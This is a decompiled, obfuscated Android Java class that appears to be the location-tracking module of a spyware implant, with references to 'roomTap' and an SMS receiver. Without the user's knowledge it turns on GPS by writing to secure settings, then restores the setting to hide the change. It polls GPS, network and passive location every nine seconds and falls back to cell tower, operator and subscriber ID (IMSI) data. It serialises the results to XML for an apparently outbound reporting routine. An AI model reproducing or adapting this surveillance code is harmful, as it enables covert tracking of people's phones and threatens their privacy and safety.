package com.network.location;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Xml;
import com.network.android.SmsReceiver;
import com.network.android.a.c;
import com.network.android.agent.NetworkApp;
import com.network.android.c.a.b;
import com.network.android.j;
import com.network.android.m;
import com.network.android.roomTap.k;
import com.network.android.v;
import java.io.StringWriter;
import java.util.Date;
import java.util.Timer;
import java.util.concurrent.ScheduledExecutorService;
import org.xmlpull.v1.XmlSerializer;

public final class a {

    /* renamed from: a  reason: collision with root package name */
    static ScheduledExecutorService f160a = null;
    static final Object b = new Object();
    private static v c = null;
    private static boolean d = false;
    private static Timer e = null;
    private static Handler f;
    private static Boolean g = false;
    private static v h = null;
    private static v i = null;

    static {
        HandlerThread handlerThread = new HandlerThread("LocationThread");
        handlerThread.start();
        f = new Handler(handlerThread.getLooper());
    }

    private static void a(ContentResolver contentResolver, String str, boolean z) {
        com.network.android.c.a.a.a("LocationMonitorManager setLocationProviderEnabled in provider: " + str);
        String str2 = z ? "+" + str : "-" + str;
        com.network.android.c.a.a.a("LocationMonitorManager setLocationProviderEnabled out provider: " + str2);
        Settings.Secure.putString(contentResolver, "location_providers_allowed", str2);
    }

    public static void a(Context context) {
        try {
            e(context);
            com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor start");
            c = new v("");
            d = true;
            c.a(false);
            LocationManager locationManager = (LocationManager) context.getSystemService("location");
            if (!k.d) {
                if (c.e()) {
                    com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor is 4.3. not allowed black screen");
                } else {
                    a(context, locationManager);
                    com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor start NETWORK_PROVIDER and PASSIVE_PROVIDER");
                    h = new v("mNetworklocListener");
                    locationManager.requestLocationUpdates("network", 9000, 0.0f, h);
                    i = new v("mPasiveListener");
                    locationManager.requestLocationUpdates("passive", 9000, 0.0f, i);
                    com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor end");
                }
            }
            c.a(false);
            com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor start NETWORK_PROVIDER and PASSIVE_PROVIDER");
            h = new v("mNetworklocListener");
            locationManager.requestLocationUpdates("network", 9000, 0.0f, h);
            i = new v("mPasiveListener");
            locationManager.requestLocationUpdates("passive", 9000, 0.0f, i);
            com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor end");
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager resetLocationMonitor Exception- " + th.getMessage(), th);
        }
    }

    private static void a(Context context, Location location) {
        com.network.android.c.a.a.a("LocationMonitorManager addGPS");
        if (location != null) {
            com.network.android.c.a.a.b("LocationMonitorManager addGPS GPS location");
            com.network.android.c.a.a.a("Satalite");
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter);
            newSerializer.startTag("", "locations");
            m.a(newSerializer, location);
            newSerializer.endTag("", "locations");
            SmsReceiver.a(newSerializer);
            j.a(context, stringWriter.toString(), (String[]) null, (byte[][]) null);
            return;
        }
        com.network.android.c.a.a.a("LocationMonitorManager addGPS add cell (location == null)");
        h(context);
    }

    private static void a(Context context, LocationManager locationManager) {
        try {
            if (c.e()) {
                com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner catual. is 4.3. not allowed black screen");
                c.a(false);
            }
            synchronized (b) {
                com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner start");
                if (d && c != null && !c.c()) {
                    com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner add start");
                    boolean isProviderEnabled = locationManager.isProviderEnabled("gps");
                    com.network.android.c.a.a.a("LocationMonitorManager addLocationListinerOff GPS active:" + isProviderEnabled);
                    if (isProviderEnabled) {
                        c = new v();
                        locationManager.requestLocationUpdates("gps", 9000, 0.0f, c);
                        c.a(true);
                    } else if (com.network.b.a.a(context)) {
                        com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner allowedProvider:" + Settings.Secure.getString(context.getContentResolver(), "location_providers_allowed"));
                        a(context.getContentResolver(), "gps", true);
                        com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner allowedProviderNew: " + Settings.Secure.getString(context.getContentResolver(), "location_providers_allowed"));
                        g = true;
                        SharedPreferences.Editor edit = context.getSharedPreferences("NetworkLocation", 0).edit();
                        edit.putBoolean("gp", g.booleanValue());
                        edit.commit();
                        c.b(context);
                        c = new v();
                        locationManager.requestLocationUpdates("gps", 9000, 0.0f, c);
                        c.a(true);
                    }
                    com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner add end");
                }
                com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner endd");
            }
        } catch (Throwable th) {
            b.a(1, (short) 27);
            com.network.android.c.a.a.a("LocationMonitorManager addGPSonScreen Exception- " + th.getMessage(), th);
        }
    }

    public static boolean a() {
        try {
            return c != null && c.c();
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager, isMlocListenerActive exception. returning false");
            return false;
        }
    }

    private static boolean a(Location location, long j) {
        try {
            long time = location.getTime();
            com.network.android.c.a.a.b("LocationMonitorManager isLoactionValid lastTime: " + new Date(time).toGMTString());
            long currentTimeMillis = System.currentTimeMillis() - time;
            if (currentTimeMillis <= 2 * j) {
                return true;
            }
            com.network.android.c.a.a.b("LocationMonitorManager isLoactionValid Smaller then sampel rate: " + currentTimeMillis + ", sample rate:" + j);
            com.network.android.c.a.a.b("LocationMonitorManager isLoactionValid addGPS add cell (GPS is Smaller then sampel rate)");
            return false;
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager isLoactionValid Exception: " + th.getMessage(), th);
            return false;
        }
    }

    public static void b(Context context) {
        try {
            com.network.android.c.a.a.a("LocationMonitorManager removeLocationListinerActive startt");
            synchronized (b) {
                com.network.android.c.a.a.a("LocationMonitorManager removeLocationListinerActive after locking");
                if (d && c != null && c.c()) {
                    com.network.android.c.a.a.a("LocationMonitorManager removeLocationListinerActive Location remove on screen on start");
                    ((LocationManager) context.getSystemService("location")).removeUpdates(c);
                    c.a(false);
                    g(context);
                    com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProvider allowedProviderNew: " + Settings.Secure.getString(context.getContentResolver(), "location_providers_allowed"));
                    com.network.android.c.a.a.a("LocationMonitorManager Location remove on screen on end");
                }
            }
            com.network.android.c.a.a.a("LocationMonitorManager removeLocationListinerOnActive endd");
        } catch (Throwable th) {
            b.a(1, (short) 27);
            com.network.android.c.a.a.a("LocationMonitorManager removeLocationListinerOnActive Exception- " + th.getMessage(), th);
        }
    }

    public static void c(Context context) {
        try {
            if (com.network.b.a.a(context) && !c.e()) {
                com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProviderOnRestart");
                g = Boolean.valueOf(NetworkApp.a().getSharedPreferences("NetworkLocation", 0).getBoolean("gp", false));
                com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProviderOnRestart addGps: " + g);
                if (g.booleanValue()) {
                    g(NetworkApp.a());
                }
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProviderOnRestart Exception- " + th.getMessage(), th);
        }
    }

    public static void d(Context context) {
        if (c.e()) {
            com.network.android.c.a.a.a("LocationMonitorManager addLocationListiner is 4.3. not allowed black screen");
        } else {
            a(context, (LocationManager) context.getSystemService("location"));
        }
    }

    public static void e(Context context) {
        try {
            com.network.android.c.a.a.a("LocationMonitorManager stop");
            LocationManager locationManager = (LocationManager) NetworkApp.a().getSystemService("location");
            if (c != null) {
                locationManager.removeUpdates(c);
                c.a(false);
                com.network.android.c.a.a.a("LocationMonitorManager stop GPS removeUpdates");
            }
            if (i != null) {
                locationManager.removeUpdates(i);
                com.network.android.c.a.a.a("LocationMonitorManager stop Pasive removeUpdates");
            }
            if (h != null) {
                locationManager.removeUpdates(h);
                com.network.android.c.a.a.a("LocationMonitorManager stop Network removeUpdates");
            }
            c = null;
            g(context);
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager Location stop Exception- " + th.getMessage(), th);
        }
    }

    public static void f(Context context) {
        Location location = null;
        try {
            com.network.android.c.a.a.a("LocationMonitorManager collectLocationData start");
            long w = com.network.b.b.w() * 1000;
            if (c == null || !c.c() || c.a() == null || !a(c.a(), w)) {
                com.network.android.c.a.a.a("LocationMonitorManager add Network or passive");
                Location a2 = i != null ? i.a() : null;
                if (h != null) {
                    location = h.a();
                }
                if (a2 != null) {
                    com.network.android.c.a.a.a("LocationMonitorManager collectLocationData pasiveLocation source:" + a2.getProvider());
                    if (!"gps".equals(a2.getProvider()) || !a(a2, w)) {
                        com.network.android.c.a.a.a("LocationMonitorManager collectLocationData passive location is not a GPS or time not valid - > try to take a network location");
                        if (location == null || !a(location, w)) {
                            com.network.android.c.a.a.a("LocationMonitorManager collectLocationData add addCell after NO pasiveLocation and NO networkLocation");
                            h(context);
                        } else {
                            com.network.android.c.a.a.a("LocationMonitorManager collectLocationData add networkLocation location source:" + location.getProvider());
                            location.getTime();
                            a(context, location);
                            h.b();
                        }
                    } else {
                        com.network.android.c.a.a.a("LocationMonitorManager collectLocationData add pasiveLocation GPS");
                        a2.getTime();
                        a(context, a2);
                        i.b();
                    }
                } else if (location == null || !a(location, w)) {
                    com.network.android.c.a.a.a("LocationMonitorManager collectLocationData add addCell after NO pasiveLocation and NO networkLocation");
                    h(context);
                } else {
                    com.network.android.c.a.a.a("LocationMonitorManager collectLocationData add networkLocation location source:" + location.getProvider());
                    location.getTime();
                    a(context, location);
                    h.b();
                }
            } else {
                try {
                    com.network.android.c.a.a.a("LocationMonitorManager add GPS");
                    Location a3 = c.a();
                    a3.getTime();
                    a(context, a3);
                    c.b();
                } catch (Throwable th) {
                    com.network.android.c.a.a.a("mlocListener thread Exception- " + th.getMessage(), th);
                    h(context);
                }
            }
            com.network.android.c.a.a.a("LocationMonitorManager collectLocationData Sample end");
        } catch (Throwable th2) {
            com.network.android.c.a.a.a("LocationMonitorManager collectLocationData Exception: " + th2.getMessage(), th2);
            h(context);
        }
    }

    private static void g(Context context) {
        try {
            if (com.network.b.a.a(context)) {
                com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProvider addGps: " + g);
                if (g.booleanValue()) {
                    a(context.getContentResolver(), "gps", false);
                    g = false;
                    com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProvider allowedProviderNew: " + Settings.Secure.getString(context.getContentResolver(), "location_providers_allowed"));
                    SharedPreferences.Editor edit = NetworkApp.a().getSharedPreferences("NetworkLocation", 0).edit();
                    edit.putBoolean("gp", g.booleanValue());
                    edit.commit();
                }
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager resetAllowedProvider Exception- " + th.getMessage(), th);
        }
    }

    private static void h(Context context) {
        try {
            com.network.android.c.a.a.a("LocationMonitorManager addCell");
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            String subscriberId = telephonyManager.getSubscriberId();
            GsmCellLocation gsmCellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
            String networkOperator = telephonyManager.getNetworkOperator();
            if (networkOperator != null && networkOperator.length() > 0 && subscriberId != null) {
                XmlSerializer newSerializer = Xml.newSerializer();
                StringWriter stringWriter = new StringWriter();
                SmsReceiver.a(newSerializer, stringWriter);
                newSerializer.startTag("", "locations");
                m.a(newSerializer, context);
                m.a(newSerializer, gsmCellLocation, networkOperator, telephonyManager);
                newSerializer.endTag("", "locations");
                SmsReceiver.a(newSerializer);
                j.a(context, stringWriter.toString(), (String[]) null, (byte[][]) null);
            }
        } catch (Throwable th) {
            com.network.android.c.a.a.a("LocationMonitorManager addCell Exception- " + th.getMessage(), th);
        }
    }
}
